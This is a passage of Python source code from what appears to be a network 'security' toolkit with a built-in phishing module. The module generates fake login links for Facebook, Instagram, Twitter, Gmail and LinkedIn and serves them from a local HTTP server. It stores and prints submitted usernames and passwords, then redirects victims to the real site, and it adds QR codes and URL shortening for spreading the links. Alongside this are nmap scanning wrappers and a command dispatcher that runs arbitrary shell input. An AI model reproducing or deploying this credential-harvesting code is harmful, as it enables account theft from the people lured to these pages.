            self.cursor.execute('SELECT COUNT(*) FROM monitored_ips WHERE is_active = 1')
            stats['active_monitored_ips'] = self.cursor.fetchone()[0]
            
            # Count phishing links
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            # Count captured credentials
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    # Phishing link methods
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, created_at, clicks, qr_code_path)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.original_url, link.phishing_url, link.template,
                  link.created_at, link.clicks, None))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_links ORDER BY created_at DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        """Get phishing link by ID"""
        try:
            self.cursor.execute('''
                SELECT * FROM phishing_links WHERE id = ?
            ''', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        """Update click count for phishing link"""
        try:
            self.cursor.execute('''
                UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?
            ''', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional_data))
            self.conn.commit()
            logger.info(f"Credentials captured for link {link_id} from {ip_address}")
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        """Get phishing templates"""
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name
                ''', (platform,))
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates ORDER BY platform, name
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    def save_phishing_template(self, name: str, platform: str, html_content: str) -> bool:
        """Save phishing template"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO phishing_templates (name, platform, html_content)
                VALUES (?, ?, ?)
            ''', (name, platform, html_content))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing template: {e}")
            return False
    
    def close(self):
        """Close database connection"""
        try:
            self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Comprehensive network tools"""
    
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 300) -> CommandResult:
        """Execute shell command"""
        start_time = time.time()
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time,
                error=None if result.returncode == 0 else f"Exit code: {result.returncode}"
            )
            
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            return CommandResult(
                success=False,
                output=f"Command timed out after {timeout} seconds",
                execution_time=execution_time,
                error='Timeout'
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(
                success=False,
                output='',
                execution_time=execution_time,
                error=str(e)
            )
    
    @staticmethod
    def ping(target: str, count: int = 4, size: int = 56, timeout: int = 1, 
             flood: bool = False, **kwargs) -> CommandResult:
        """Ping with advanced options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), '-l', str(size), '-w', str(timeout * 1000)]
                if flood:
                    cmd.append('-t')
            else:
                cmd = ['ping', '-c', str(count), '-s', str(size), '-W', str(timeout)]
                if flood:
                    cmd.append('-f')
            
            cmd.append(target)
            
            return NetworkTools.execute_command(cmd, timeout * count + 5)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30, no_dns: bool = True, **kwargs) -> CommandResult:
        """Traceroute with options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert']
                if no_dns:
                    cmd.append('-d')
                cmd.extend(['-h', str(max_hops)])
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1']
                    if no_dns:
                        cmd.append('-n')
                elif shutil.which('traceroute'):
                    cmd = ['traceroute']
                    if no_dns:
                        cmd.append('-n')
                    cmd.extend(['-m', str(max_hops)])
                elif shutil.which('tracepath'):
                    cmd = ['tracepath', '-m', str(max_hops)]
                else:
                    return CommandResult(
                        success=False,
                        output='No traceroute tool found',
                        execution_time=0,
                        error='No traceroute tool available'
                    )
            
            cmd.append(target)
            return NetworkTools.execute_command(cmd, timeout=60)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def nmap_scan(target: str, scan_type: str = "quick", ports: str = None, **kwargs) -> CommandResult:
        """Nmap scan with options"""
        try:
            cmd = ['nmap']
            
            # Base scan type
            if scan_type == "quick":
                cmd.extend(['-T4', '-F'])
            elif scan_type == "quick_scan":
                cmd.extend(['-T4', '-F', '--max-rtt-timeout', '100ms', '--max-retries', '1'])
            elif scan_type == "comprehensive":
                cmd.extend(['-sS', '-sV', '-sC', '-A', '-O'])
            elif scan_type == "stealth":
                cmd.extend(['-sS', '-T2', '--max-parallelism', '100', '--scan-delay', '5s'])
            elif scan_type == "vulnerability":
                cmd.extend(['-sV', '--script', 'vuln'])
            elif scan_type == "full":
                cmd.extend(['-p-', '-T4'])
            elif scan_type == "udp":
                cmd.extend(['-sU', '-T4'])
            elif scan_type == "os_detection":
                cmd.extend(['-O', '--osscan-guess'])
            elif scan_type == "service_detection":
                cmd.extend(['-sV', '--version-intensity', '5'])
            
            # Custom ports
            if ports:
                if ports.isdigit():
                    cmd.extend(['-p', ports])
                else:
                    cmd.extend(['-p', ports])
            elif scan_type not in ["full"]:
                cmd.extend(['-p', '1-1000'])
            
            # Additional options
            if kwargs.get('no_ping'):
                cmd.append('-Pn')
            if kwargs.get('ipv6'):
                cmd.append('-6')
            
            cmd.append(target)
            
            return NetworkTools.execute_command(cmd, timeout=600)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def curl_request(url: str, method: str = "GET", **kwargs) -> CommandResult:
        """cURL request"""
        try:
            cmd = ['curl', '-s', '-X', method]
            
            if kwargs.get('timeout'):
                cmd.extend(['-m', str(kwargs['timeout'])])
            if kwargs.get('headers'):
                for key, value in kwargs['headers'].items():
                    cmd.extend(['-H', f'{key}: {value}'])
            if kwargs.get('data'):
                cmd.extend(['-d', kwargs['data']])
            if kwargs.get('insecure'):
                cmd.append('-k')
            if kwargs.get('verbose'):
                cmd.append('-v')
            
            cmd.extend(['-w', '\nTime: %{time_total}s\nCode: %{http_code}\nSize: %{size_download} bytes\n'])
            cmd.append(url)
            
            return NetworkTools.execute_command(cmd, timeout=kwargs.get('timeout', 30) + 5)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A')
                    }
            
            return {'success': False, 'ip': ip, 'error': 'Location lookup failed'}
                
        except Exception as e:
            return {'success': False, 'ip': ip, 'error': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> CommandResult:
        """WHOIS lookup"""
        if not WHOIS_AVAILABLE:
            return CommandResult(
                success=False,
                output='WHOIS not available',
                execution_time=0,
                error='Install python-whois package'
            )
        
        try:
            import whois
            start_time = time.time()
            result = whois.whois(target)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=True,
                output=str(result),
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def dns_lookup(domain: str, record_type: str = "A") -> CommandResult:
        """DNS lookup"""
        try:
            cmd = ['dig', domain, record_type, '+short']
            return NetworkTools.execute_command(cmd, timeout=10)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"
    
    @staticmethod
    def shorten_url(url: str) -> str:
        """Shorten URL using TinyURL"""
        if not SHORTENER_AVAILABLE:
            return url
        
        try:
            import pyshorteners
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except Exception as e:
            logger.error(f"Failed to shorten URL: {e}")
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        """Generate QR code for URL"""
        if not QRCODE_AVAILABLE:
            return False
        
        try:
            import qrcode
            qr = qrcode.QRCode(
                version=1,
                box_size=10,
                border=5
            )
            qr.add_data(url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except Exception as e:
            logger.error(f"Failed to generate QR code: {e}")
            return False

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    """Network monitoring and threat detection"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.monitoring = False
        self.monitored_ips = set()
        self.thresholds = {
            'port_scan': self.config.get('monitoring', {}).get('port_scan_threshold', 10),
            'syn_flood': self.config.get('monitoring', {}).get('syn_flood_threshold', 100),
            'ddos': self.config.get('monitoring', {}).get('ddos_threshold', 1000)
        }
        self.threads = []
    
    def start_monitoring(self):
        """Start network monitoring"""
        if self.monitoring:
            return
        
        self.monitoring = True
        logger.info("Starting network monitoring...")
        
        # Load monitored IPs from database
        monitored = self.db.get_monitored_ips(active_only=True)
        self.monitored_ips = {ip['ip_address'] for ip in monitored}
        
        # Start monitoring threads
        self.threads = [
            threading.Thread(target=self._monitor_system, daemon=True),
            threading.Thread(target=self._monitor_threats, daemon=True)
        ]
        
        for thread in self.threads:
            thread.start()
        
        logger.info(f"Network monitoring started with {len(self.threads)} threads")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitoring = False
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.threads = []
        logger.info("Network monitoring stopped")
    
    def _monitor_system(self):
        """Monitor system metrics"""
        while self.monitoring:
            try:
                # Log system metrics to database
                cpu = psutil.cpu_percent(interval=1)
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                net = psutil.net_io_counters()
                connections = len(psutil.net_connections())
                
                # Check for high resource usage
                if cpu > 90:
                    self._create_threat_alert(
                        threat_type="High CPU Usage",
                        source_ip="localhost",
                        severity="high",
                        description=f"CPU usage at {cpu}%",
                        action_taken="Logged"
                    )
                
                if mem.percent > 90:
                    self._create_threat_alert(
                        threat_type="High Memory Usage",
                        source_ip="localhost",
                        severity="high",
                        description=f"Memory usage at {mem.percent}%",
                        action_taken="Logged"
                    )
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"System monitor error: {e}")
                time.sleep(10)
    
    def _monitor_threats(self):
        """Monitor for threats"""
        while self.monitoring:
            try:
                connections = psutil.net_connections()
                
                # Analyze connections for threats
                source_counts = {}
                for conn in connections:
                    if conn.raddr:
                        source_ip = conn.raddr.ip
                        source_counts[source_ip] = source_counts.get(source_ip, 0) + 1
                
                # Check thresholds
                for source_ip, count in source_counts.items():
                    if count > self.thresholds['port_scan']:
                        self._create_threat_alert(
                            threat_type="Possible Port Scan",
                            source_ip=source_ip,
                            severity="medium",
                            description=f"{count} connections from this IP",
                            action_taken="Monitoring"
                        )
                
                time.sleep(30)
                
            except Exception as e:
                logger.error(f"Threat monitor error: {e}")
                time.sleep(10)
    
    def _create_threat_alert(self, threat_type: str, source_ip: str, 
                            severity: str, description: str, action_taken: str):
        """Create threat alert"""
        alert = ThreatAlert(
            timestamp=datetime.datetime.now().isoformat(),
            threat_type=threat_type,
            source_ip=source_ip,
            severity=severity,
            description=description,
            action_taken=action_taken
        )
        
        self.db.log_threat(alert)
        
        # Log to console with color
        if severity == "high":
            log_msg = f"{Colors.RED}🚨 HIGH THREAT: {threat_type} from {source_ip}{Colors.RESET}"
        elif severity == "medium":
            log_msg = f"{Colors.YELLOW}⚠️ MEDIUM THREAT: {threat_type} from {source_ip}{Colors.RESET}"
        else:
            log_msg = f"{Colors.CYAN}ℹ️ INFO: {threat_type} from {source_ip}{Colors.RESET}"
        
        print(log_msg)
        logger.info(f"Threat alert: {threat_type} from {source_ip} ({severity})")
    
    def add_ip_to_monitoring(self, ip: str) -> bool:
        """Add IP to monitoring"""
        try:
            ipaddress.ip_address(ip)
            self.monitored_ips.add(ip)
            self.db.add_monitored_ip(ip, "Added via monitoring")
            logger.info(f"Added IP to monitoring: {ip}")
            return True
        except ValueError:
            logger.error(f"Invalid IP address: {ip}")
            return False
    
    def remove_ip_from_monitoring(self, ip: str) -> bool:
        """Remove IP from monitoring"""
        if ip in self.monitored_ips:
            self.monitored_ips.remove(ip)
            logger.info(f"Removed IP from monitoring: {ip}")
            return True
        return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get monitoring status"""
        return {
            'monitoring': self.monitoring,
            'monitored_ips_count': len(self.monitored_ips),
            'monitored_ips': list(self.monitored_ips)[:10],  # First 10 only
            'thresholds': self.thresholds
        }

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing pages"""
    
    server_instance = None
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        try:
            if self.path == '/':
                self.send_phishing_page()
            elif self.path.startswith('/capture'):
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
            elif self.path == '/favicon.ico':
                self.send_response(404)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error handling GET request: {e}")
    
    def do_POST(self):
        """Handle POST requests (form submissions)"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse form data
            form_data = urllib.parse.parse_qs(post_data)
            
            # Extract credentials
            username = form_data.get('email', form_data.get('username', ['']))[0]
            password = form_data.get('password', [''])[0]
            
            # Get client information
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            # Save captured credentials
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id,
                    username,
                    password,
                    client_ip,
                    user_agent,
                    json.dumps(dict(self.headers))
                )
                
                # Log to console
                logger.info(f"Credentials captured from {client_ip}: {username}:{password}")
                
                # Print to console
                print(f"\n{Colors.RED}🎣 PHISHING ATTACK DETECTED!{Colors.RESET}")
                print(f"{Colors.YELLOW}📧 Credentials captured:{Colors.RESET}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
                print(f"  User-Agent: {user_agent[:50]}...")
            
            # Redirect to real site
            self.send_response(302)
            if 'facebook' in self.server_instance.platform:
                self.send_header('Location', 'https://www.facebook.com')
            elif 'instagram' in self.server_instance.platform:
                self.send_header('Location', 'https://www.instagram.com')
            elif 'twitter' in self.server_instance.platform:
                self.send_header('Location', 'https://twitter.com')
            elif 'gmail' in self.server_instance.platform:
                self.send_header('Location', 'https://mail.google.com')
            elif 'linkedin' in self.server_instance.platform:
                self.send_header('Location', 'https://www.linkedin.com')
            else:
                self.send_header('Location', 'https://www.google.com')
            self.end_headers()
            
        except Exception as e:
            logger.error(f"Error handling POST request: {e}")
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        """Send the phishing page"""
        try:
            if self.server_instance and self.server_instance.html_content:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(self.server_instance.html_content.encode('utf-8'))
                
                # Increment click count
                if self.server_instance.db and self.server_instance.link_id:
                    self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error sending phishing page: {e}")
            self.send_response(500)
            self.end_headers()

class PhishingServer:
    """Phishing server for hosting fake login pages"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.server_thread = None
        self.running = False
        self.port = 8080
        self.link_id = None
        self.platform = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        """Start phishing server"""
        try:
            self.link_id = link_id
            self.platform = platform
            self.html_content = html_content
            self.port = port
            
            # Create server
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            
            # Start server in thread
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            
            logger.info(f"Phishing server started on port {port}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop(self):
        """Stop phishing server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            logger.info("Phishing server stopped")
    
    def get_url(self) -> str:
        """Get server URL"""
        local_ip = NetworkTools.get_local_ip()
        return f"http://{local_ip}:{self.port}"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None, 
                              custom_template: str = None) -> Dict[str, Any]:
        """Generate phishing link for specified platform"""
        try:
            # Generate unique ID
            link_id = str(uuid.uuid4())[:8]
            
            # Get template
            if custom_template:
                html_content = custom_template
            else:
                templates = self.db.get_phishing_templates(platform)
                if templates:
                    html_content = templates[0].get('html_content', '')
                else:
                    # Use default template
                    if platform == "facebook":
                        html_content = self.db._get_facebook_template()
                    elif platform == "instagram":
                        html_content = self.db._get_instagram_template()
                    elif platform == "twitter":
                        html_content = self.db._get_twitter_template()
                    elif platform == "gmail":
                        html_content = self.db._get_gmail_template()
                    elif platform == "linkedin":
                        html_content = self.db._get_linkedin_template()
                    else:
                        # Custom template
                        html_content = custom_template or self._get_custom_template()
            
            # Create phishing link
            phishing_link = PhishingLink(
                id=link_id,
                platform=platform,
                original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080/{link_id}",
                template=platform,
                created_at=datetime.datetime.now().isoformat()
            )
            
            # Save to database
            self.db.save_phishing_link(phishing_link)
            
            # Store in active links
            self.active_links[link_id] = {
                'platform': platform,
                'html': html_content,
                'created': datetime.datetime.now()
            }
            
            return {
                'success': True,
                'link_id': link_id,
                'platform': platform,
                'phishing_url': phishing_link.phishing_url,
                'created_at': phishing_link.created_at
            }
            
        except Exception as e:
            logger.error(f"Failed to generate phishing link: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _get_custom_template(self) -> str:
        """Get custom phishing template"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 28px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            opacity: 0.9;
        }
        .links {
            text-align: center;
            margin-top: 20px;
        }
        .links a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 5px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Login</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign In</button>
                <div class="links">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server for a specific link"""
        if link_id not in self.active_links:
            logger.error(f"Link ID {link_id} not found")
            return False
        
        link_data = self.active_links[link_id]
        
        # Get link from database for click tracking
        db_link = self.db.get_phishing_link(link_id)
        if not db_link:
            logger.error(f"Link {link_id} not found in database")
            return False
        
        return self.phishing_server.start(
            link_id=link_id,
            platform=link_data['platform'],
            html_content=link_data['html'],
            port=port
        )
    
    def stop_phishing_server(self):
        """Stop phishing server"""
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        """Get phishing server URL"""
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        """Get active phishing links"""
        links = []
        for link_id, data in self.active_links.items():
            links.append({
                'link_id': link_id,
                'platform': data['platform'],
                'created': data['created'].isoformat(),
                'server_running': self.phishing_server.running and self.phishing_server.link_id == link_id
            })
        return links
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        """Generate QR code for phishing link"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server.running:
            url = self.phishing_server.get_url()
        
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        
        if NetworkTools.generate_qr_code(url, qr_filename):
            return qr_filename
        
        return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        """Shorten phishing URL"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server.running:
            url = self.phishing_server.get_url()
        
        return NetworkTools.shorten_url(url)

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Handle all 500+ commands including social engineering"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.tools = NetworkTools()
        self.social_tools = SocialEngineeringTools(db)
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict[str, callable]:
        """Setup command execution map"""
        return {
            # Ping commands
            'ping': self._execute_ping,
            'ping4': self._execute_ping,
            'ping6': self._execute_ping6,
            
            # Scan commands
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'nmap': self._execute_nmap,
            'portscan': self._execute_portscan,
            'full_scan': self._execute_full_scan,
            
            # Traceroute commands
            'traceroute': self._execute_traceroute,
            'tracert': self._execute_traceroute,
            'tracepath': self._execute_tracepath,
            
            # Web commands
            'curl': self._execute_curl,
            'wget': self._execute_wget,
            'http': self._execute_http,
            
            # Info commands
            'whois': self._execute_whois,
            'dig': self._execute_dig,
            'dns': self._execute_dns,
            'location': self._execute_location,
            'analyze': self._execute_analyze,
            
            # System commands
            'system': self._execute_system,
            'network': self._execute_network,
            'status': self._execute_status,
            'ps': self._execute_ps,
            'top': self._execute_top,
            
            # Security commands
            'threats': self._execute_threats,
            'report': self._execute_report,
            'monitor': self._execute_monitor,
            
            # Social Engineering commands
            'generate_phishing_link_for_facebook': self._execute_phishing_facebook,
            'generate_phishing_link_for_instagram': self._execute_phishing_instagram,
            'generate_phishing_link_for_twitter': self._execute_phishing_twitter,
            'generate_phishing_link_for_gmail': self._execute_phishing_gmail,
            'generate_phishing_link_for_linkedin': self._execute_phishing_linkedin,
            'generate_phishing_link_for_custom': self._execute_phishing_custom,
            'phishing_start_server': self._execute_phishing_start,
            'phishing_stop_server': self._execute_phishing_stop,
            'phishing_status': self._execute_phishing_status,
            'phishing_links': self._execute_phishing_links,
            'phishing_credentials': self._execute_phishing_credentials,
            'phishing_qr': self._execute_phishing_qr,
            'phishing_shorten': self._execute_phishing_shorten,
            'phishing_template': self._execute_phishing_template,
        }
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return results"""
        start_time = time.time()
        
        # Parse command
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command")
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        # Execute command
        try:
            if cmd_name in self.command_map:
                result = self.command_map[cmd_name](args)
            else:
                # Try as generic shell command
                result = self._execute_generic(command)
            
            execution_time = time.time() - start_time
            
            # Log command to database
            self.db.log_command(
                command=command,
                source=source,
                success=result.get('success', False),
                output=result.get('output', '')[:5000],
                execution_time=execution_time
            )
            
            result['execution_time'] = execution_time
            return result
        
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error executing command: {e}"
            
            self.db.log_command(
                command=command,
                source=source,
                success=False,
                output=error_msg,
                execution_time=execution_time
            )
            
            return self._create_result(False, error_msg, execution_time)
    
    def _create_result(self, success: bool, data: Any, 
                      execution_time: float = 0.0) -> Dict[str, Any]:
        """Create standardized result"""
        if isinstance(data, str):
            return {
                'success': success,
                'output': data,
                'execution_time': execution_time
            }
        else:
            return {
                'success': success,
                'data': data,
                'execution_time': execution_time
            }
    
    # Command handlers
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ping <target>")
        
        target = args[0]
        count = 4
        size = 56
        
        if len(args) > 1:
            for i in range(1, len(args)):
                if args[i] == '-c' and i + 1 < len(args):
                    try:
                        count = int(args[i + 1])
                    except:
                        pass
                elif args[i] == '-s' and i + 1 < len(args):
                    try:
                        size = int(args[i + 1])
                    except:
                        pass
        
        result = self.tools.ping(target, count, size)
        return self._create_result(result.success, result.output)
    
    def _execute_ping6(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ping6 <target>")
        
        # For IPv6 ping
        target = args[0]
        if platform.system().lower() == 'windows':
            cmd = ['ping', '-6', target]
        else:
            cmd = ['ping6', target]
        
        cmd.extend(args[1:])
        return self._execute_generic(' '.join(cmd))
    
    def _execute_scan(self, args: List[str]) -> Dict[str, Any]:
        """Standard scan (ports 1-1000)"""
        if not args:
            return self._create_result(False, "Usage: scan <target> [ports]")
        
        target = args[0]
        ports = "1-1000"
        scan_type = "quick"
        
        if len(args) > 1:
            ports = args[1]
        
        result = self.tools.nmap_scan(target, scan_type, ports)
        
        if result.success:
            # Parse open ports from nmap output
            open_ports = self._parse_nmap_output(result.output)
            
            # Log scan to database
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            
            return self._create_result(True, {
                'target': target,
                'scan_type': scan_type,
                'ports_scanned': ports,
                'open_ports': open_ports,
                'output': result.output[-2000:]  # Last 2000 chars
